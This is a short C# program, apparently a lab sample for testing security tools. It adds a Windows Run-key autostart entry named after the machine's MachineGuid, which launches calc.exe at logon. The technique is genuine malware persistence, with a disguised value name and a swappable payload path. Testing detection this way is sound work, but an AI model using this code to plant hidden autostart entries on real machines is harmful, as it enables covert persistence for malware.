using System;
using Microsoft.Win32;

namespace PersistenceSample
{
    public class Program
    {
        public static void Main()
        {
            try
            {
                // Retrieve the MachineGuid to simulate realistic value names
                string deviceId = DeviceInfo.GetUUID();

                // DYNAMIC ANALYSIS CONFIGURATION:
                // Target a benign executable natively present on Windows 11.
                // We use an environment variable path to check if security tools map it correctly.
                string basePayload = @"%SystemRoot%\System32\calc.exe";

                // Expand the path to absolute format so it executes perfectly on system startup
                string functionalCommand = Environment.ExpandEnvironmentVariables(basePayload);

                // Optional: Append a flag or trace parameter to distinctly track the execution event in your lab logs
                string finalCommandWithArgs = $"\"{functionalCommand}\" /A DynamicAnalysisTest_A06_1a";

                Console.WriteLine($"[*] Target Payload Path configured: {finalCommandWithArgs}");

                // Establish persistence under the current user context
                RegistryHelper.SetRunKey(deviceId, finalCommandWithArgs);

                Console.WriteLine($"[+] Persistence successfully configured under value name: {deviceId}");
                Console.WriteLine("[*] Ready for analysis. Restart the system or log off/on to trace execution.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] An error occurred: {ex.Message}");
            }
        }
    }

    public static class DeviceInfo
    {
        public static string GetUUID()
        {
            using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            using (var subKey = baseKey.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
            {
                if (subKey != null)
                {
                    object value = subKey.GetValue("MachineGuid");
                    if (value != null)
                    {
                        return new Guid(value.ToString().Trim()).ToString("N");
                    }
                }
            }

            return Guid.Empty.ToString("N");
        }
    }

    public static class RegistryHelper
    {
        private const string RunKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";

        public static void SetRunKey(string name, string command)
        {
            using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64))
            using (var subKey = baseKey.OpenSubKey(RunKeyPath, true))
            {
                if (subKey != null)
                {
                    subKey.SetValue(name, command);
                }
                else
                {
                    throw new InvalidOperationException("Unable to open the specified Registry key path.");
                }
            }
        }
    }
}